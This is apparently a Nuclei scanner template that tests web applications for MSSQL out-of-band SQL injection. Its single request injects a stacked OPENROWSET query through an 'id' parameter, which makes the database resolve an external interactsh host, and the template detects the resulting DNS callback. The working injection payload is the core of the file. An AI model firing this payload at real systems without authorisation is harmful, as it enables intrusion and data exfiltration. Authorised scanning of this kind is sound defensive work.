http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  method: GET
  path:
  - '{{BaseURL}}/?id=1; SELECT * FROM OPENROWSET(''MSDASQL'', ''DRIVER={Microsoft
    Access Text Driver (*.txt;)};DefaultDir=\\{{interactsh-url}}\\;'', ''SELECT *
    FROM test'')--'
  stop-at-first-match: true
id: ai-mssql-oob-openrowset-http
info:
  author: reewardius
  name: MSSQL OOB via OPENROWSET HTTP Request
  severity: critical
  tags: sqli,oob,mssql,http
